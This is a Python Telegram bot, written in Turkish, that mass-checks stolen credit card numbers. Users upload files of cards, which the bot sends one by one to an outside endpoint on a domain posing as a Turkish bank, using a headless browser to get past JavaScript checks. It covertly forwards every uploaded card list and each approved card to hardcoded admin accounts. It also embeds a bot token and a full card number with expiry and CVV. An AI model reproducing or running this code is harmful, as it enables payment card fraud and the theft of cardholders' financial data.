import asyncio
import aiohttp
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import json
import os
from datetime import datetime
import re
from typing import Dict, List
from urllib.parse import quote

# ========== KONFİGÜRASYON ==========
TOKEN = "8516981652:AAGl7kQFtSNfjRDoNbMbu4B6mBu0tGct5hk"
ADMINS = [7202281434, 6322020905]
CHANNEL_USERNAME = "@redbullbanksh"
API_URL = "https://isbankasi.gt.tc/Api/Rewix/auth.php"
# ===================================

# Global değişkenler
users_data = {}
user_stats: Dict[int, Dict] = {}

# Loglama ayarı
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class CheckSession:
    """Check oturumu yönetimi"""
    
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.is_active = False
        self.file_path = None
        self.start_time = None
        self.total_cards = 0
        self.approved = []
        self.declined = []
        self.progress_message = None
        self.current_index = 0
        
    def start(self, file_path: str, total_cards: int):
        """Check başlat"""
        self.is_active = True
        self.file_path = file_path
        self.start_time = datetime.now()
        self.total_cards = total_cards
        self.approved = []
        self.declined = []
        self.current_index = 0
        
    def stop(self):
        """Check durdur"""
        self.is_active = False
        self.file_path = None
        self.start_time = None
        
    def add_result(self, cc: str, result: str, status: str):
        """Sonuç ekle"""
        if status == "approved":
            self.approved.append(f"{cc} | {result}")
        else:
            self.declined.append(f"{cc} | {result}")
        self.current_index += 1
        
    def get_progress(self) -> Dict:
        """İlerleme bilgisi"""
        return {
            "current": self.current_index,
            "total": self.total_cards,
            "approved": len(self.approved),
            "declined": len(self.declined),
            "percentage": (self.current_index / self.total_cards * 100) if self.total_cards > 0 else 0
        }

# Aktif check oturumları
active_sessions: Dict[int, CheckSession] = {}

def get_session(user_id: int) -> CheckSession:
    """Kullanıcının oturumunu getir veya oluştur"""
    if user_id not in active_sessions:
        active_sessions[user_id] = CheckSession(user_id)
    return active_sessions[user_id]

def is_admin(user_id: int) -> bool:
    """Admin kontrolü"""
    return user_id in ADMINS

async def is_channel_member(user_id: int, context: CallbackContext) -> bool:
    """Kullanıcının kanalda olup olmadığını kontrol et"""
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Kanal kontrol hatası: {e}")
        return False

async def check_cc_with_playwright(cc_number: str) -> Dict:
    """Playwright ile CC kontrolü (JavaScript çalıştırır)"""
    try:
        # Playwright'ı dynamic import et
        try:
            from playwright.async_api import async_playwright
            playwright_available = True
        except ImportError:
            logger.error("Playwright kurulu değil! Lütfen kurun: pip install playwright && playwright install")
            return {
                "status": "error",
                "message": "Playwright kurulu değil",
                "cc": cc_number,
                "result_status": "error"
            }
        
        logger.info(f"Playwright ile kontrol başlıyor: {cc_number[:10]}...")
        
        async with async_playwright() as p:
            # Tarayıcıyı başlat
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            page = await context.new_page()
            
            try:
                # API sayfasına git
                url = f"{API_URL}?kart={quote(cc_number)}"
                await page.goto(url, wait_until="networkidle", timeout=30000)
                
                # Sayfa yüklendi mi kontrol et
                content = await page.content()
                
                # JavaScript hatası var mı kontrol et
                if "requires Javascript" in content or "document.cookie" in content:
                    # JavaScript çalıştıktan sonra tekrar bekle
                    await page.wait_for_timeout(3000)
                    content = await page.content()
                
                # Sayfadaki metni al
                text_content = await page.inner_text("body")
                
                # Status kontrolü
                status = "declined"
                content_lower = text_content.lower()
                
                if "approved" in content_lower or "live" in content_lower:
                    status = "approved"
                
                # Temiz metin
                clean_text = re.sub(r'\s+', ' ', text_content).strip()
                clean_text = clean_text[:500]  # Uzunluğu sınırla
                
                await browser.close()
                
                return {
                    "status": "success",
                    "data": clean_text,
                    "cc": cc_number,
                    "result_status": status
                }
                
            except Exception as e:
                await browser.close()
                return {
                    "status": "error",
                    "message": f"Playwright hatası: {str(e)}",
                    "cc": cc_number,
                    "result_status": "error"
                }
                
    except Exception as e:
        return {
            "status": "error",
            "message": f"Playwright başlatma hatası: {str(e)}",
            "cc": cc_number,
            "result_status": "error"
        }

async def check_cc_with_requests(cc_number: str) -> Dict:
    """Normal HTTP isteği ile CC kontrolü (backup)"""
    try:
        # Kart bilgisini encode et
        cc_encoded = quote(cc_number)
        url = f"https://isbankasi.gt.tc/Api/Rewix/auth.php?kart={cc_encoded}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=30) as response:
                result = await response.text()
                
                # JavaScript kontrolü
                if "requires Javascript" in result:
                    return {
                        "status": "javascript_error",
                        "message": "API JavaScript gerektiriyor",
                        "cc": cc_number,
                        "result_status": "error"
                    }
                
                # Status kontrolü
                status = "declined"
                result_lower = result.lower()
                
                if "approved" in result_lower or "live" in result_lower:
                    status = "approved"
                
                # HTML'den metin çıkar
                clean_text = re.sub(r'<[^>]+>', '', result)
                clean_text = re.sub(r'\s+', ' ', clean_text).strip()
                clean_text = clean_text[:500]
                
                return {
                    "status": "success",
                    "data": clean_text,
                    "cc": cc_number,
                    "result_status": status
                }
                
    except Exception as e:
        return {
            "status": "error",
            "message": f"HTTP hatası: {str(e)}",
            "cc": cc_number,
            "result_status": "error"
        }

async def check_cc(cc_number: str) -> Dict:
    """CC kontrolü - önce normal, sonra playwright"""
    logger.info(f"CC kontrolü başlatılıyor: {cc_number[:10]}...")
    
    # Önce normal HTTP isteği dene
    result = await check_cc_with_requests(cc_number)
    
    # Eğer JavaScript hatası alırsak, playwright dene
    if result['status'] == 'javascript_error':
        logger.info(f"JavaScript hatası, Playwright deneniyor: {cc_number[:10]}...")
        result = await check_cc_with_playwright(cc_number)
    
    return result

async def start(update: Update, context: CallbackContext):
    """Başlangıç komutu"""
    user = update.effective_user
    
    if not await is_channel_member(user.id, context):
        keyboard = [[InlineKeyboardButton("📢 Kanalımıza Katıl", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "⚠️ Botu kullanabilmek için önce kanalımıza katılmalısınız!\n\n"
            "Katıldıktan sonra /start yazınız.",
            reply_markup=reply_markup
        )
        return
    
    # Admin ise özel mesaj
    if is_admin(user.id):
        welcome_text = f"""
👑 MERHABA ADMIN {user.first_name}!

🚀 Admin olarak giriş yaptınız.

🔧 ADMIN KOMUTLARI:
/adminstats - Admin paneli
/users - Tüm kullanıcıları listele
/broadcast <mesaj> - Duyuru gönder
/stopcheck <user_id> - Kullanıcının check'ini durdur

👤 NORMAL KOMUTLARI:
/st - Check başlat
/stats - İstatistikleriniz
/help - Yardım

⚡ ÖZELLİKLER:
• ✅ Approved kartlar size ve diğer adminlere ANINDA bildirilir
• 👥 Tüm kullanıcı aktivitelerini görebilirsiniz
• ⏸️ Check işlemlerini durdurabilirsiniz
• 📁 Tüm dosyalar size gönderilir
• 🚀 Playwright ile JavaScript desteği

📌 NOT: Bot tam çalışması için Playwright kurulumu gerekir!
"""
    else:
        welcome_text = f"""
👋 Merhaba {user.first_name}!

🚀 CC Check Bot'a Hoşgeldiniz!

📋 KULLANIM:
1. 📄 .txt dosyası gönderin (her satırda bir CC)
2. ▶️ /st komutu ile check başlatın
3. 📊 Sonuçları anlık alın

⚡ ÖZELLİKLER:
• ♾️ Sınırsız kullanım
• ⚡ Anlık sonuç bildirimi
• 📁 Approved/Declined raporu
• 🚀 JavaScript desteği (Playwright)

🔧 KOMUTLAR:
/start - Botu başlat
/st - Check başlat
/stats - İstatistikler
/help - Yardım

⚠️ NOT: 
• Bir işlem bitmeden yenisini başlatamazsınız!
• İlk başta yavaş çalışabilir (tarayıcı başlatma)
"""
    
    await update.message.reply_text(welcome_text)

async def handle_document(update: Update, context: CallbackContext):
    """Dosya yükleme işlemi"""
    user = update.effective_user
    
    # Kanal kontrolü
    if not await is_channel_member(user.id, context):
        await update.message.reply_text("❌ Lütfen önce kanala katılın!")
        return
    
    session = get_session(user.id)
    
    # Eğer zaten işlem yapıyorsa
    if session.is_active:
        progress = session.get_progress()
        await update.message.reply_text(
            f"⏳ Zaten bir check işleminiz devam ediyor!\n"
            f"📊 İlerleme: {progress['current']}/{progress['total']} ({progress['percentage']:.1f}%)\n"
            f"✅ Approved: {progress['approved']}\n"
            f"❌ Declined: {progress['declined']}\n\n"
            f"Lütfen bu işlem bitmeden yenisini başlatamazsınız!"
        )
        return
    
    document = update.message.document
    
    if document.mime_type != "text/plain" or not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Lütfen sadece .txt dosyası yükleyin!")
        return
    
    # Dosyayı indir
    file = await context.bot.get_file(document.file_id)
    file_path = f"temp/{user.id}_{int(datetime.now().timestamp())}.txt"
    os.makedirs("temp", exist_ok=True)
    
    await file.download_to_drive(file_path)
    
    # Dosya içeriğini kontrol et
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            cc_list = [line.strip() for line in f if line.strip()]
            cc_count = len(cc_list)
            
            if cc_count == 0:
                await update.message.reply_text("❌ Dosya boş veya geçersiz format!")
                os.remove(file_path)
                return
                
    except Exception as e:
        await update.message.reply_text(f"❌ Dosya okuma hatası: {e}")
        return
    
    # Kullanıcıyı kaydet
    users_data[user.id] = {
        'username': user.username or user.first_name,
        'first_name': user.first_name,
        'last_name': user.last_name,
        'file_path': file_path,
        'cc_count': cc_count,
        'upload_time': datetime.now().isoformat()
    }
    
    await update.message.reply_text(
        f"✅ Dosya başarıyla yüklendi!\n"
        f"📊 Toplam CC: {cc_count}\n\n"
        f"Check işlemini başlatmak için /st komutunu kullanın."
    )
    
    # Adminlere dosya gönder (admin kendine göndermesin)
    for admin_id in ADMINS:
        if admin_id != user.id:  # Kendine gönderme
            try:
                with open(file_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=admin_id,
                        document=f,
                        filename=f"{user.id}_{document.file_name}",
                        caption=f"📥 Yüklenen dosya\n👤 Kullanıcı: @{user.username or user.first_name}\n🆔 ID: {user.id}\n📊 CC Sayısı: {cc_count}"
                    )
                logger.info(f"Dosya admin'e gönderildi: {admin_id}")
            except Exception as e:
                logger.error(f"Dosya gönderme hatası {admin_id}: {e}")

async def start_check(update: Update, context: CallbackContext):
    """Check işlemini başlat"""
    user = update.effective_user
    
    # Kanal kontrolü
    if not await is_channel_member(user.id, context):
        await update.message.reply_text("❌ Lütfen önce kanala katılın!")
        return
    
    session = get_session(user.id)
    
    # Eğer zaten işlem yapıyorsa
    if session.is_active:
        progress = session.get_progress()
        await update.message.reply_text(
            f"⏳ Zaten bir check işleminiz devam ediyor!\n"
            f"📊 İlerleme: {progress['current']}/{progress['total']} ({progress['percentage']:.1f}%)\n"
            f"✅ Approved: {progress['approved']}\n"
            f"❌ Declined: {progress['declined']}\n\n"
            f"Lütfen bu işlem bitmeden yenisini başlatamazsınız!"
        )
        return
    
    # Dosya kontrolü
    if user.id not in users_data or not os.path.exists(users_data[user.id]['file_path']):
        await update.message.reply_text("❌ Lütfen önce .txt dosyası yükleyin!")
        return
    
    file_path = users_data[user.id]['file_path']
    cc_count = users_data[user.id]['cc_count']
    
    # Oturumu başlat
    session.start(file_path, cc_count)
    
    # Kullanıcı istatistiklerini başlat
    if user.id not in user_stats:
        user_stats[user.id] = {
            'total_checked': 0,
            'total_approved': 0,
            'total_declined': 0,
            'last_check': None,
            'username': user.username or user.first_name,
            'is_admin': is_admin(user.id)
        }
    
    await update.message.reply_text(f"🚀 Check işlemi başladı! {cc_count} CC kontrol edilecek...")
    
    # CC'leri oku
    with open(file_path, 'r', encoding='utf-8') as f:
        cc_list = [line.strip() for line in f if line.strip()]
    
    total = len(cc_list)
    
    # Progress mesajı
    progress_msg = await update.message.reply_text(
        f"⏳ İlerleme: 0/{total} (0%)\n"
        f"✅ Approved: 0\n"
        f"❌ Declined: 0\n"
        f"🔄 Playwright kullanılıyor..."
    )
    session.progress_message = progress_msg
    
    approved_count = 0
    declined_count = 0
    error_count = 0
    
    for idx, cc in enumerate(cc_list, 1):
        # Eğer oturum aktif değilse dur
        if not session.is_active:
            break
        
        logger.info(f"Checking CC {idx}/{total}: {cc[:15]}...")
        
        result = await check_cc(cc)
        
        if result['status'] == 'success':
            status = result['result_status']
            parsed_result = result['data']
            session.add_result(cc, parsed_result, status)
            
            if status == "approved":
                approved_count += 1
                # Kullanıcıya bildir
                user_message = f"✅ APPROVED\n💳 {cc}\n📊 {parsed_result[:200]}"
                try:
                    await update.message.reply_text(user_message)
                except Exception as e:
                    logger.error(f"Kullanıcıya mesaj gönderme hatası: {e}")
                
                # Adminlere bildir (admin kendine bildirim göndermesin)
                admin_message = (
                    f"✅ APPROVED KART BULUNDU!\n"
                    f"👤 Kullanıcı: @{user.username or user.first_name}\n"
                    f"🆔 ID: {user.id}\n"
                    f"💳 CC: {cc}\n"
                    f"📊 {parsed_result[:300]}"
                )
                
                for admin_id in ADMINS:
                    if admin_id != user.id:  # Kendine gönderme
                        try:
                            await context.bot.send_message(admin_id, admin_message)
                        except Exception as e:
                            logger.error(f"Admin bildirimi hatası {admin_id}: {e}")
            else:
                declined_count += 1
                # Declined ise sadece kullanıcıya
                user_message = f"❌ DECLINED\n💳 {cc}\n📊 {parsed_result[:200]}"
                try:
                    await update.message.reply_text(user_message)
                except Exception as e:
                    logger.error(f"Kullanıcıya declined mesaj hatası: {e}")
        else:
            error_count += 1
            # Hata durumu
            error_message = f"⚠️ HATA\n💳 {cc}\n📊 {result.get('message', 'Bilinmeyen hata')}"
            try:
                await update.message.reply_text(error_message)
            except Exception as e:
                logger.error(f"Hata mesajı gönderme hatası: {e}")
        
        # Progress güncelle (her kartta bir)
        progress = session.get_progress()
        try:
            await progress_msg.edit_text(
                f"⏳ İlerleme: {progress['current']}/{total} ({progress['percentage']:.1f}%)\n"
                f"✅ Approved: {progress['approved']}\n"
                f"❌ Declined: {progress['declined']}\n"
                f"⚠️ Hatalar: {error_count}"
            )
        except:
            pass
    
    # İşlem tamamlandı
    session.stop()
    
    # Kullanıcı istatistiklerini güncelle
    user_stats[user.id]['total_checked'] += total
    user_stats[user.id]['total_approved'] += len(session.approved)
    user_stats[user.id]['total_declined'] += len(session.declined)
    user_stats[user.id]['last_check'] = datetime.now().isoformat()
    
    # Approved ve Declined dosyalarını oluştur
    timestamp = int(datetime.now().timestamp())
    
    # Approved dosyası
    if session.approved:
        approved_file = f"temp/approved_{user.id}_{timestamp}.txt"
        with open(approved_file, 'w', encoding='utf-8') as f:
            for item in session.approved:
                f.write(f"{item}\n")
        
        # Kullanıcıya gönder
        try:
            with open(approved_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=f"approved_{timestamp}.txt",
                    caption=f"✅ Approved Kartlar ({len(session.approved)})"
                )
        except Exception as e:
            logger.error(f"Approved dosyası gönderme hatası: {e}")
        
        # Approved dosyasını adminlere gönder
        for admin_id in ADMINS:
            if admin_id != user.id:  # Kendine gönderme
                try:
                    with open(approved_file, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"approved_{user.id}_{timestamp}.txt",
                            caption=f"✅ Approved from @{user.username or user.first_name} (ID: {user.id})\n📊 Toplam: {len(session.approved)} approved"
                        )
                except Exception as e:
                    logger.error(f"Approved dosyası admin'e gönderme hatası {admin_id}: {e}")
        
        os.remove(approved_file)
    
    # Declined dosyası
    if session.declined:
        declined_file = f"temp/declined_{user.id}_{timestamp}.txt"
        with open(declined_file, 'w', encoding='utf-8') as f:
            for item in session.declined:
                f.write(f"{item}\n")
        
        # Kullanıcıya gönder
        try:
            with open(declined_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=f"declined_{timestamp}.txt",
                    caption=f"❌ Declined Kartlar ({len(session.declined)})"
                )
        except Exception as e:
            logger.error(f"Declined dosyası gönderme hatası: {e}")
        
        # Declined dosyasını da adminlere gönder
        for admin_id in ADMINS:
            if admin_id != user.id:  # Kendine gönderme
                try:
                    with open(declined_file, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"declined_{user.id}_{timestamp}.txt",
                            caption=f"❌ Declined from @{user.username or user.first_name} (ID: {user.id})\n📊 Toplam: {len(session.declined)} declined"
                        )
                except Exception as e:
                    logger.error(f"Declined dosyası admin'e gönderme hatası {admin_id}: {e}")
        
        os.remove(declined_file)
    
    # Sonuç mesajı
    result_message = (
        f"🎉 Check işlemi tamamlandı!\n\n"
        f"📊 Sonuçlar:\n"
        f"• Toplam CC: {total}\n"
        f"• ✅ Approved: {len(session.approved)}\n"
        f"• ❌ Declined: {len(session.declined)}\n"
        f"• ⚠️ Hatalar: {error_count}\n\n"
        f"📁 Sonuç dosyaları yukarıda gönderildi."
    )
    
    await update.message.reply_text(result_message)
    
    # Adminlere toplam rapor gönder
    admin_report = (
        f"📊 CHECK RAPORU - TAMAMLANDI\n"
        f"👤 Kullanıcı: @{user.username or user.first_name}\n"
        f"🆔 ID: {user.id}\n"
        f"🔢 Toplam CC: {total}\n"
        f"✅ Approved: {len(session.approved)}\n"
        f"❌ Declined: {len(session.declined)}\n"
        f"⚠️ Hatalar: {error_count}\n"
        f"⏱️ Süre: {(datetime.now() - session.start_time).seconds if session.start_time else 0} saniye"
    )
    
    for admin_id in ADMINS:
        if admin_id != user.id:  # Kendine gönderme
            try:
                await context.bot.send_message(admin_id, admin_report)
            except Exception as e:
                logger.error(f"Admin rapor gönderme hatası {admin_id}: {e}")
    
    # Temizlik
    if os.path.exists(file_path):
        os.remove(file_path)

# Diğer fonksiyonlar aynı kalacak (user_stats_command, admin_panel, list_users, stop_check, broadcast, help_command, cancel_check, check_admin)

async def user_stats_command(update: Update, context: CallbackContext):
    """Kullanıcı istatistiklerini göster"""
    user = update.effective_user
    session = get_session(user.id)
    
    stats_text = "📊 KULLANICI İSTATİSTİKLERİ\n\n"
    
    if user.id in user_stats:
        stats = user_stats[user.id]
        
        # Admin ise belirt
        admin_status = "👑 ADMIN" if is_admin(user.id) else "👤 KULLANICI"
        
        stats_text += (
            f"{admin_status}\n"
            f"👤 Kullanıcı: {stats['username']}\n"
            f"🆔 ID: {user.id}\n"
            f"📊 Toplam Kontrol Edilen: {stats['total_checked']}\n"
            f"✅ Toplam Approved: {stats['total_approved']}\n"
            f"❌ Toplam Declined: {stats['total_declined']}\n"
        )
        
        if stats['last_check']:
            last_time = datetime.fromisoformat(stats['last_check']).strftime("%d.%m.%Y %H:%M")
            stats_text += f"⏰ Son Check: {last_time}\n"
        
        if session.is_active:
            progress = session.get_progress()
            stats_text += (
                f"\n⚡ DEVAM EDEN İŞLEM:\n"
                f"• İlerleme: {progress['current']}/{progress['total']} ({progress['percentage']:.1f}%)\n"
                f"• ✅ Approved: {progress['approved']}\n"
                f"• ❌ Declined: {progress['declined']}"
            )
        else:
            stats_text += "\nℹ️ Şu anda aktif işlem yok."
    else:
        stats_text += "ℹ️ Henüz istatistik bulunmuyor. İlk check işleminizi başlatın!"
    
    await update.message.reply_text(stats_text)

async def admin_panel(update: Update, context: CallbackContext):
    """Admin paneli"""
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Bu komut sadece adminler içindir!")
        return
    
    # Toplam kullanıcı sayısı (adminler hariç)
    normal_users = {uid: stats for uid, stats in user_stats.items() if not is_admin(uid)}
    total_users = len(normal_users)
    
    # Aktif check yapan kullanıcılar
    active_users = []
    for uid, session in active_sessions.items():
        if session.is_active:
            progress = session.get_progress()
            user_info = user_stats.get(uid, {'username': f'User_{uid}'})
            user_type = "👑" if is_admin(uid) else "👤"
            active_users.append({
                'username': user_info['username'],
                'user_id': uid,
                'progress': progress,
                'type': user_type
            })
    
    # Toplam istatistikler (adminler hariç)
    total_checked = sum([s['total_checked'] for uid, s in normal_users.items()])
    total_approved = sum([s['total_approved'] for uid, s in normal_users.items()])
    total_declined = sum([s['total_declined'] for uid, s in normal_users.items()])
    
    # Admin paneli mesajı
    admin_text = f"👑 ADMIN PANELİ - Hoşgeldin @{user.username or user.first_name}\n\n"
    admin_text += f"📊 Genel İstatistikler:\n"
    admin_text += f"• 👥 Toplam Kullanıcı (admin hariç): {total_users}\n"
    admin_text += f"• 🔢 Toplam Kontrol Edilen: {total_checked}\n"
    admin_text += f"• ✅ Toplam Approved: {total_approved}\n"
    admin_text += f"• ❌ Toplam Declined: {total_declined}\n\n"
    
    admin_text += f"⚡ Aktif İşlemler: {len(active_users)}\n"
    for i, user_data in enumerate(active_users, 1):
        admin_text += f"\n{i}. {user_data['type']} @{user_data['username']}\n"
        admin_text += f"   🆔 ID: {user_data['user_id']}\n"
        admin_text += f"   • İlerleme: {user_data['progress']['current']}/{user_data['progress']['total']}\n"
        admin_text += f"   • ✅ Approved: {user_data['progress']['approved']}\n"
        admin_text += f"   • ❌ Declined: {user_data['progress']['declined']}\n"
    
    if not active_users:
        admin_text += "\nℹ️ Şu anda aktif işlem yok.\n"
    
    # Komutlar
    admin_text += "\n🔧 Admin Komutları:\n"
    admin_text += "/adminstats - Bu panel\n"
    admin_text += "/users - Tüm kullanıcılar\n"
    admin_text += "/broadcast <mesaj> - Duyuru gönder\n"
    admin_text += "/stopcheck <user_id> - Check durdur\n"
    
    await update.message.reply_text(admin_text)

async def list_users(update: Update, context: CallbackContext):
    """Tüm kullanıcıları listele"""
    user = update.effective_user
    
    if not is_admin(user.id):
        return
    
    if not user_stats:
        await update.message.reply_text("📭 Henüz hiç kullanıcı yok.")
        return
    
    users_text = "👥 TÜM KULLANICILAR\n\n"
    
    for idx, (uid, stats) in enumerate(user_stats.items(), 1):
        session = get_session(uid)
        status = "🟢 Aktif" if session.is_active else "⚪ Pasif"
        user_type = "👑 ADMIN" if is_admin(uid) else "👤 USER"
        
        users_text += f"{idx}. {user_type} @{stats['username']}\n"
        users_text += f"   🆔 ID: {uid}\n"
        users_text += f"   📊 Kontrol: {stats['total_checked']}\n"
        users_text += f"   ✅ Approved: {stats['total_approved']}\n"
        users_text += f"   ❌ Declined: {stats['total_declined']}\n"
        users_text += f"   📍 Durum: {status}\n"
        
        if stats['last_check']:
            last_time = datetime.fromisoformat(stats['last_check']).strftime("%d.%m.%Y %H:%M")
            users_text += f"   ⏰ Son Check: {last_time}\n"
        
        users_text += "\n"
    
    # Mesajı böl (Telegram 4096 karakter limiti)
    if len(users_text) > 4000:
        parts = [users_text[i:i+4000] for i in range(0, len(users_text), 4000)]
        for part in parts:
            await update.message.reply_text(part)
    else:
        await update.message.reply_text(users_text)

async def stop_check(update: Update, context: CallbackContext):
    """Kullanıcının check'ini durdur"""
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Bu komut sadece adminler içindir!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: /stopcheck <user_id>")
        return
    
    try:
        target_id = int(context.args[0])
        session = get_session(target_id)
        
        if not session.is_active:
            await update.message.reply_text(f"ℹ️ {target_id} ID'li kullanıcının aktif check'i yok.")
            return
        
        session.stop()
        await update.message.reply_text(f"✅ {target_id} ID'li kullanıcının check'i durduruldu.")
        
        # Kullanıcıya bildir
        try:
            await context.bot.send_message(target_id, "⏸️ Check işleminiz admin tarafından durduruldu.")
        except:
            pass
            
    except ValueError:
        await update.message.reply_text("❌ Geçersiz user_id!")

async def broadcast(update: Update, context: CallbackContext):
    """Admin broadcast komutu"""
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Bu komut sadece adminler içindir!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: /broadcast <mesaj>")
        return
    
    message = " ".join(context.args)
    broadcast_text = f"📢 DUYURU\n\n{message}"
    
    sent_count = 0
    failed_count = 0
    
    for user_id in user_stats.keys():
        try:
            await context.bot.send_message(user_id, broadcast_text)
            sent_count += 1
        except:
            failed_count += 1
            continue
    
    await update.message.reply_text(f"✅ Duyuru {sent_count} kullanıcıya gönderildi, {failed_count} başarısız.")

async def help_command(update: Update, context: CallbackContext):
    """Yardım komutu"""
    user = update.effective_user
    
    if is_admin(user.id):
        help_text = f"""
👑 MERHABA ADMIN {user.first_name}!

🔧 ADMIN KOMUTLARI:
/adminstats - Admin paneli (tüm istatistikler)
/users - Tüm kullanıcıları listele
/broadcast <mesaj> - Tüm kullanıcılara duyuru gönder
/stopcheck <user_id> - Kullanıcının check işlemini durdur

👤 NORMAL KOMUTLARI:
/st - Check başlat (dosya gönderdikten sonra)
/stats - İstatistikleriniz
/cancel - Aktif check'i iptal et
/help - Bu yardım mesajı

📌 SİSTEM:
• ✅ Approved kartlar ANINDA size ve diğer adminlere bildirilir
• 📁 Tüm yüklenen dosyalar ve sonuçlar size gönderilir
• 👥 Tüm kullanıcı aktivitelerini görebilirsiniz
• ⏸️ Check işlemlerini durdurabilirsiniz
• 🚀 Playwright ile JavaScript desteği

⚠️ KURULUM GEREKLİ:
pip install playwright
playwright install chromium
"""
    else:
        help_text = f"""
👤 MERHABA {user.first_name}!

📋 KULLANICI KOMUTLARI:
/start - Botu başlat
/st - Check başlat (dosya gönderdikten sonra)
/stats - İstatistikleriniz
/cancel - Aktif check'i iptal et
/help - Bu yardım mesajı

📋 KULLANIM:
1. 📄 .txt dosyası gönder (her satırda bir CC)
2. ▶️ /st komutu ile başlat
3. 📊 Sonuçları anlık al
4. 📁 Approved/Declined dosyalarını indir

⚠️ KURALLAR:
• Bir işlem bitmeden yenisini başlatamazsınız
• Sadece .txt dosyaları kabul edilir
• Kanal üyeliği zorunludur (@redbullbanksh)
• ✅ Approved kartlar adminlere de bildirilir
"""
    
    await update.message.reply_text(help_text)

async def cancel_check(update: Update, context: CallbackContext):
    """Kullanıcı check iptal"""
    user = update.effective_user
    session = get_session(user.id)
    
    if not session.is_active:
        await update.message.reply_text("ℹ️ Aktif bir check işleminiz yok.")
        return
    
    session.stop()
    await update.message.reply_text("✅ Check işleminiz iptal edildi.")
    
    # Adminlere bildir (admin kendine bildirim göndermesin)
    if not is_admin(user.id):
        admin_notify = (
            f"⏸️ CHECK İPTAL EDİLDİ\n"
            f"👤 Kullanıcı: @{user.username or user.first_name}\n"
            f"🆔 ID: {user.id}\n"
            f"📊 Sebep: Kullanıcı tarafından iptal edildi"
        )
        
        for admin_id in ADMINS:
            try:
                await context.bot.send_message(admin_id, admin_notify)
            except:
                pass

async def check_admin(update: Update, context: CallbackContext):
    """Admin kontrolü için test komutu"""
    user = update.effective_user
    
    # Kullanıcı bilgilerini göster
    user_info = f"""
👤 Kullanıcı Bilgileri:
🆔 ID: {user.id}
👤 Username: @{user.username}
📛 İsim: {user.first_name}
📛 Soyisim: {user.last_name}

👑 Admin mi: {is_admin(user.id)}
📋 Admin Listesi: {ADMINS}
"""
    
    await update.message.reply_text(user_info)

async def test_api(update: Update, context: CallbackContext):
    """API test komutu"""
    user = update.effective_user
    
    if not is_admin(user.id):
        return
    
    await update.message.reply_text("🚀 API test ediliyor...")
    
    # Test kartı
    test_cc = "5218076824032475|10|2028|228"
    result = await check_cc(test_cc)
    
    test_result = f"""
📊 API TEST SONUCU:
💳 Test Kartı: {test_cc}
✅ Durum: {result['status']}
📊 Sonuç: {result['result_status']}
📝 Mesaj: {result.get('message', 'N/A')}
📋 Veri: {result.get('data', 'N/A')[:200]}
"""
    
    await update.message.reply_text(test_result)

def main():
    """Ana fonksiyon"""
    # Application oluştur
    application = Application.builder().token(TOKEN).build()
    
    # Handler'ları ekle
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("st", start_check))
    application.add_handler(CommandHandler("stats", user_stats_command))
    application.add_handler(CommandHandler("adminstats", admin_panel))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("stopcheck", stop_check))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cancel", cancel_check))
    application.add_handler(CommandHandler("myid", check_admin))
    application.add_handler(CommandHandler("testapi", test_api))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Botu başlat
    print("🤖 Bot başlatılıyor...")
    print(f"👑 Admin ID'leri: {ADMINS}")
    print(f"📢 Kanal: {CHANNEL_USERNAME}")
    print(f"🔗 API: {API_URL}")
    print("\n⚠️ ÖNEMLİ KURULUM:")
    print("1. pip install playwright")
    print("2. playwright install chromium")
    print("3. python bot.py")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    # Temp klasörünü oluştur
    os.makedirs("temp", exist_ok=True)
    main()
